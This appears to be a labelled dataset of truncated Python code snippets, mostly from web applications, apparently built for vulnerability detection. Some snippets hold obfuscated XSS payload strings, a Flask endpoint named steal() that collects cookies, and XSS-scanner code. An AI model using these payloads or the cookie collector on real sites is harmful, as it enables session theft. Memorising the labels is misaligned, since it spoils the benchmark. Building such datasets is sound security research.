12856, "code": " False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration", "label": 0}, {"snippet_id": 41150, "code": "\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title", "label": 0}, {"snippet_id": 25453, "code": "=self, **kwargs.pop('widget_kwargs',{}) ) defaults.update(**kwargs) for fname, label, size in self.scheme['fields']: defaults['label']=label field=forms.CharField(**defaults) field.part_name=fname fields", "label": 0}, {"snippet_id": 42441, "code": " \t\t\t\t({columns}) values({values})\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tcolumns=\", \".join([\"`\"+c+\"`\" for c in columns]), \t\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns)) \t\t\t\t), list(d.values())) \t\texcept", "label": 0}, {"snippet_id": 23821, "code": ".format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'", "label": 0}, {"snippet_id": 20414, "code": ".path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true", "label": 0}, {"snippet_id": 6212, "code": " return self.config.getint(self.section, 'num_threads') @property def logdir(self): \"\"\" Path to CherryPy logfiles(string). Something like '/var/log/idp' maybe. \"\"\" res=self.config.get(self.section, 'logdir", "label": 0}, {"snippet_id": 15623, "code": " courses in them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`. \"\"\" msg=colorize('green', \"Importing courses from{}...\"", "label": 0}, {"snippet_id": 33067, "code": " ul_with_the_desired_toc_entries=toc_ul_li[1] else: ul_with_the_desired_toc_entries=toc_ul toc_node.remove(toc_ul) contents=ElementTree.SubElement(toc_node, 'h2') contents.text='Contents' contents.tail='", "label": 0}, {"snippet_id": 16227, "code": "[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,", "label": 0}, {"snippet_id": 40334, "code": ".get(\"allow_on_submit\"))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html(value, linkify=df.fieldtype=='Text Editor') \t\t\tself.set(fieldname, sanitized_value) \tdef _save_passwords(self): \t\t'''Save", "label": 0}, {"snippet_id": 23674, "code": " BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns", "label": 1}, {"snippet_id": 41134, "code": "('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route", "label": 0}, {"snippet_id": 14519, "code": "), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view", "label": 0}, {"snippet_id": 53912, "code": ") app=Flask(__name__) @app.route('/') def index(): \treturn 'Hello ^_^' @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values", "label": 0}, {"snippet_id": 24306, "code": " is a subset): test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style", "label": 0}, {"snippet_id": 43470, "code": "'fields',{'fieldtype':('=', 'Password')}): \t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue \t\t\tnew_password=self.get(df.fieldname) \t\t\tif new_password", "label": 0}, {"snippet_id": 31549, "code": " \t\t\tmetrics[rep_date]={} \t\t\tmetrics[rep_date]['conn']=str(i[1]) \t\tdf=pd.DataFrame.from_dict(metrics, orient=\"index\") \t\tdf=df.fillna(0) \t\tdf.index=pd.to_datetime(df.index) \t\tdf.index.name='Date' \t\tdf.sort_index", "label": 0}, {"snippet_id": 24603, "code": "/manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together", "label": 0}, {"snippet_id": 8379, "code": "'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/',", "label": 0}, {"snippet_id": 14421, "code": "'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$", "label": 0}, {"snippet_id": 50142, "code": " sess.disconnect() self.last_alive.pop(csessid, None) if not self.last_alive: self.keep_alive.stop() self.keep_alive=None def at_login(self): \"\"\" Called when this session gets authenticated by the server", "label": 0}, {"snippet_id": 4492, "code": " @staticmethod def fuzzUnicode(cnt=1): for i in xrange(cnt): yield unichr(random.randint(0, 0xffff)) @staticmethod def fuzzUnicodeReplace(s, cnt=1): s=s.replace(\"A\", \"\u0100\", cnt) s=s.replace(\"A\", \"\u0102\", cnt", "label": 0}, {"snippet_id": 10163, "code": "'', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('", "label": 0}, {"snippet_id": 18949, "code": " settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration", "label": 0}, {"snippet_id": 28789, "code": "\tssh_enable=sshs[3] \t\tssh_user_name=sshs[4] \t\tssh_user_password=sshs[5] \t\tssh_key_name=fullpath+'/keys/%s.pem' % sshs[2] \tservers=sql.select_servers(server=serv) \tfor server in servers: \t\tssh_port=server[10", "label": 0}, {"snippet_id": 9296, "code": ">[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=", "label": 0}, {"snippet_id": 13630, "code": ".views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 52569, "code": "'-')[0], node['id'][:4]) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def action_parameters(request): response={'status': -1} parameters=set() try: node_data=json.loads(request", "label": 0}, {"snippet_id": 54889, "code": " ) from pontoon.base.models import( ChangedEntityLocale, Entity, Locale, Project, ProjectLocale, TranslationMemoryEntry, Translation, ) from pontoon.base.utils import( require_AJAX, readonly_exists, ) from", "label": 0}, {"snippet_id": 13890, "code": "\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$", "label": 0}, {"snippet_id": 44301, "code": " workflow=Workflow(document=doc) else: doc=None workflow=Workflow() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) workflow_data=workflow.get_data() api=get_oozie", "label": 0}, {"snippet_id": 24942, "code": ").__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir", "label": 0}, {"snippet_id": 6815, "code": " @property def max_authn_failures_per_month(self): \"\"\" Disallow login for a user after N failures in a given month. This is said to be an imminent Kantara requirement. \"\"\" return self.config.getint(self", "label": 0}, {"snippet_id": 17193, "code": "', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\")", "label": 0}, {"snippet_id": 45758, "code": " request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=bundle.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value'])", "label": 0}, {"snippet_id": 53796, "code": "-results.com/web?q=\" +user_dork +\"&page=\" +str(page)) parser=BeautifulSoup(send.data, features=\"lxml\") for link in parser.find_all('cite'): result=link.string x=str(input(\"[Input Script] >_ \")) print(str", "label": 1}, {"snippet_id": 5693, "code": "/t.cn/><script src=/>', '<object//data=//t.cn>', '<s=\" onclick=confirm``>clickme', '<svG oNLoad=co\\u006efirm& '\\'\"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src", "label": 0}, {"snippet_id": 6260, "code": "(string). Something like '/dev/log' maybe. \"\"\" res=self.config.get(self.section, 'syslog_socket') if not res: res=None return res @property def debug(self): \"\"\" Set to True to log debug messages(boolean)", "label": 0}, {"snippet_id": 23014, "code": ", name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$", "label": 0}, {"snippet_id": 45761, "code": " submission form: %s' % params_form.errors)) else: parameters=bundle.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]", "label": 0}, {"snippet_id": 50684, "code": ".client_disconnect(self.csessid) self.sessionhandler.disconnect(self) def at_login(self): csession=self.get_client_session() if csession: csession[\"webclient_authenticated_uid\"]=self.uid csession.save(", "label": 0}, {"snippet_id": 4572, "code": "'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'h2', 'h3', ", "label": 0}, {"snippet_id": 25024, "code": " self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course", "label": 0}, {"snippet_id": 28635, "code": " group\") \t\tsys.exit() \t def check_login(**kwargs): \timport sql \timport http.cookies \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_uuid=cookie.get('uuid') \tref=os.environ.get(\"SCRIPT_NAME", "label": 0}, {"snippet_id": 8501, "code": "'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),", "label": 0}, {"snippet_id": 38373, "code": "(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t", "label": 0}, {"snippet_id": 48125, "code": " PIL.Image.LANCZOS) cropped.save(low_res_file_name) m.text=text m.cachedText=compile_markdown(text) m.category=category m.highResFile=\"/\" +high_res_file_name m.lowResFile=\"/\" +low_res_file_name m.headline", "label": 1}, {"snippet_id": 13062, "code": ", name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$'", "label": 0}, {"snippet_id": 49740, "code": ".168.0.1 8080\" exit() PORT=sys.argv[2].strip() HOST=sys.argv[1].strip() print \"Listening on\",HOST+\":\"+PORT app=Flask(__name__) app.secret_key='I Am Batman.' access_key=\"Tony Stark Is The Best.\" session_id", "label": 0}, {"snippet_id": 29060, "code": " STATS_USER=\"+stats_user+\" STATS_PASS=\"+stats_password] \t \terror=str(upload(serv, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \t\t \tos.system(\"rm -f %s\" % script) \tssh_command(serv, commands", "label": 0}, {"snippet_id": 44732, "code": "')) copied_properties=json.loads(request.POST.get('copiedProperties', '{}')) _properties=dict(NODES[node['widgetType']].get_fields()) _properties.update(dict([(_property['name'], _property['value']) for", "label": 0}, {"snippet_id": 23387, "code": ", url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login", "label": 0}, {"snippet_id": 29406, "code": "(cfg): \ttry: \t\tconf=open(cfg, \"r\") \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t read export config file</div>') \t \tfirewalld_commands=[] \t \tfor line in conf: \t\tif \"bind\" in line: \t\t", "label": 0}, {"snippet_id": 8811, "code": "(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/", "label": 0}, {"snippet_id": 19517, "code": "), expected_verbosity_string) def test_invalid_verbosity_and_processes(self): \"\"\" If an invalid combination of verbosity and number of processors is passed in, a BuildFailure should be raised \"\"\" suite", "label": 0}, {"snippet_id": 10067, "code": "--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules", "label": 0}, {"snippet_id": 40268, "code": "\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname", "label": 0}, {"snippet_id": 10780, "code": "('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self", "label": 1}, {"snippet_id": 18251, "code": "(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id", "label": 1}, {"snippet_id": 19481, "code": " num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"\" With the above test, validate", "label": 0}, {"snippet_id": 17814, "code": "=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': ", "label": 0}, {"snippet_id": 41423, "code": "\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type", "label": 0}, {"snippet_id": 9796, "code": ".provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth", "label": 0}, {"snippet_id": 45696, "code": " response['id']=bundle_doc.id response['message']=_('Saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_bundle(request, doc_id", "label": 0}, {"snippet_id": 15577, "code": ".sh\".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming", "label": 0}, {"snippet_id": 21464, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor", "label": 0}, {"snippet_id": 14078, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts", "label": 0}, {"snippet_id": 32144, "code": " q in mapping.ud.lower()] def get_rules_as_json(mapping): rules=getattr(mapping, 'rules', None) if rules: rules=json.dumps(rules, indent=4) return safestring.mark_safe(rules) class MappingsTable(tables", "label": 1}, {"snippet_id": 46408, "code": "=Document2.objects.create(name=collection['name'], uuid=collection['uuid'], type='search-dashboard', owner=request.user, description=collection['label']) Document.objects.link(dashboard_doc, owner=request", "label": 0}, {"snippet_id": 22311, "code": ".password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url", "label": 0}, {"snippet_id": 5626, "code": "(1)\">click', '<a href=javas& '<--`<img/src=` onerror=confirm``> --!>', '\\'\"</Script><Html Onmouseover=(confirm)()//' '<imG/sRc=l oNerrOr=(prompt)() x>', '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x", "label": 0}, {"snippet_id": 1865, "code": ").decode('utf8').encode('ascii','ignore') return decoded_payload def xss_post_method(url,method,headers,body,scanid=None): print url, headers,method,body temp_body={} post_vul_param='' for key,value in", "label": 0}, {"snippet_id": 50311, "code": "[csessid]=(time.time(), False) if not self.keep_alive: self.keep_alive=LoopingCall(self._keepalive) self.keep_alive.start(_KEEPALIVE, now=False) return jsonify({'msg': host_string, 'csessid': csessid})", "label": 0}, {"snippet_id": 13773, "code": "/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/", "label": 1}, {"snippet_id": 35761, "code": "\t\t\t\tmax_length=cint(df.get(\"length\")) or cint(default_column_max_length) \t\t\t\tif len(cstr(value)) > max_length: \t\t\t\t\tif self.parentfield and self.idx: \t\t\t\t\t\treference=_(\"{0}, Row{1}\").format(_(self.doctype", "label": 0}, {"snippet_id": 46454, "code": ".description=dashboard_doc1.description=collection['description'] dashboard_doc.save() dashboard_doc1.save() response['status']=0 response['id']=dashboard_doc.id response['message']=_('Page saved !') else:", "label": 0}, {"snippet_id": 1845, "code": "-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload).decode('utf8').encode('ascii',", "label": 0}, {"snippet_id": 11260, "code": " environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if", "label": 0}, {"snippet_id": 24520, "code": " or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services() if not self.testsonly", "label": 0}, {"snippet_id": 30040, "code": "'ssl_cert')) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssl keys file. Check ssh keys path in config</div>') \telse: \t\tprint('<div class=\"alert alert-success\">SSL file was upload to", "label": 0}, {"snippet_id": 33971, "code": ".blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t", "label": 0}, {"snippet_id": 23616, "code": "', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager", "label": 0}, {"snippet_id": 32602, "code": " +'/README.md') elif path.lower().endswith('.png'): self._DoImage(full_path, 'image/png') elif path.lower().endswith('.jpg'): self._DoImage(full_path, 'image/jpeg') elif os.path.isdir(full_path): self._DoDirListing", "label": 0}, {"snippet_id": 20, "code": " Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt", "label": 0}, {"snippet_id": 16273, "code": "\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i", "label": 0}, {"snippet_id": 28137, "code": ".get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid') \tuser=sql.get_user_name_by_uuid(user_id.value) \tservers=sql.get_dick_permit() \ttoken=sql.get_token(user_id.value) \trole=sql.get_user_role_by_uuid(user_id", "label": 0}, {"snippet_id": 12031, "code": "/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views", "label": 0}, {"snippet_id": 44607, "code": " workflow_doc.dependencies=dependencies workflow_doc.update_data({'workflow': workflow}) workflow_doc.update_data({'layout': layout}) workflow_doc.name=workflow['name'] workflow_doc.save() workflow_instance", "label": 0}, {"snippet_id": 25361, "code": "'_%s' % i, widget_value, final_attrs, renderer=renderer)) return mark_safe(self.format_output(output)) def format_output(self, rendered_widgets) -> str: return '<div class=\"nameparts-form-group\">%s</div", "label": 0}, {"snippet_id": 18533, "code": "]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$", "label": 0}, {"snippet_id": 25643, "code": ".attendee_emails_required, label=_('Attendee email'), initial=(cartpos.attendee_email if cartpos else orderpos.attendee_email) ) for q in questions: answers=[a for a in pos.answerlist if a.question_id==q.id] if answers", "label": 0}, {"snippet_id": 21756, "code": "'ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',", "label": 0}, {"snippet_id": 1280, "code": ": for data in records: data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) if data['scanid']: if data['scanid'] not in scanids: scanids.append({\"scanid\": data['scanid'], \"name\": data['name'],", "label": 0}, {"snippet_id": 2552, "code": "\"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update", "label": 0}, {"snippet_id": 34864, "code": "=self.doctype \t\tfor df in self.meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t\t\tdoc[df.fieldname]=[d.as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t", "label": 0}, {"snippet_id": 49159, "code": ".append(column) if not self.is_reverse() and self.current_columns[0]==self.column_id: return self.get_url_with_query_params({ self.ordering_query_param: '-{}.{}'.format(self.column_id, \".\".join(new_query)", "label": 0}, {"snippet_id": 33847, "code": "\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict", "label": 0}, {"snippet_id": 34583, "code": "(key) \t\t\t\tif not value[\"doctype\"]: \t\t\t\t\traise AttributeError(key) \t\t\tvalue=get_controller(value[\"doctype\"])(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype ", "label": 0}, {"snippet_id": 19278, "code": ", test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('',", "label": 0}, {"snippet_id": 21723, "code": "/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r", "label": 0}, {"snippet_id": 6791, "code": " def authn_info_mongo_uri(self): \"\"\" Authn info(failed logins etc.) MongoDB connection URI(string). See MongoDB documentation for details. If not set, Kantara authn logs will not be maintained. \"\"\" return", "label": 0}, {"snippet_id": 42100, "code": ".get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: \t\t\t\tif df.fieldtype==\"Check\": \t\t\t\t\tif d", "label": 0}, {"snippet_id": 5315, "code": "'layer', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nobr', 'noembed', 'noframes', 'nolayer', 'noscript', 'object', 'ol', ", "label": 0}, {"snippet_id": 31671, "code": " p.items(): \t\tplots.append(value) \t\t \tgrid=gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location=\"left\", toolbar_options=dict(logo=None)) \tshow(grid) \t if form.getvalue('get_hap_v'", "label": 0}, {"snippet_id": 40165, "code": " \tdef _validate_update_after_submit(self): \t\t \t\tdb_values=frappe.get_doc(self.doctype, self.name).as_dict() \t\tfor key in self.as_dict(): \t\t\tdf=self.meta.get_field(key) \t\t\tdb_value=db_values.get(key) \t\t", "label": 0}, {"snippet_id": 12992, "code": "), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view", "label": 0}, {"snippet_id": 30899, "code": "'configs', 'haproxy_save_configs_dir') \t \tif form.getvalue('configver') is None:\t \t\tcfg=hap_configs_dir +serv +\"-\" +funct.get_data('config') +\".cfg\" \t\tfunct.get_config(serv, cfg) \telse: \t\tcfg=hap_configs_dir", "label": 0}, {"snippet_id": 2000, "code": "\"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger", "label": 0}, {"snippet_id": 39566, "code": " \t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields(self): \t\t\"\"\"Get mandatory fields that", "label": 0}, {"snippet_id": 9785, "code": "'openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views", "label": 0}, {"snippet_id": 40014, "code": "\t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif df.fieldtype=='Date' or df.fieldtype", "label": 0}, {"snippet_id": 46102, "code": ".GET.get('qd') template='search.mako' if is_mobile: template='search_m.mako' return render(template, request,{ 'collection': collection, 'query': json.dumps(query), 'initial': json.dumps({ 'collections':[", "label": 1}, {"snippet_id": 44275, "code": "(workflows) }) @check_document_access_permission() def edit_workflow(request): workflow_id=request.GET.get('workflow') if workflow_id: wid={} if workflow_id.isdigit(): wid['id']=workflow_id else: wid['uuid", "label": 1}, {"snippet_id": 6983, "code": "'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request'", "label": 0}, {"snippet_id": 25875, "code": ".TYPE_TIME: field=forms.TimeField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).time() if initial and initial.answer else None, widget=TimePickerWidget", "label": 0}, {"snippet_id": 30757, "code": "=\"viewsttats.py?serv=%s\" title=\"View stat\" target=\"_blank\">Look it</a> or <a href=\"edit.py\" title=\"Edit\">Edit something else</a></h3><br />' %(enable, backend, serv, serv)) \t\t\t \tfunct.ssh_command(serv,", "label": 0}, {"snippet_id": 41109, "code": ".content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse", "label": 0}, {"snippet_id": 39930, "code": "\\n\") \t\t\t \t\t\tif not filter(None, options): \t\t\t\tcontinue \t\t\t \t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags", "label": 0}, {"snippet_id": 44686, "code": " mimetype=\"application/json\") def 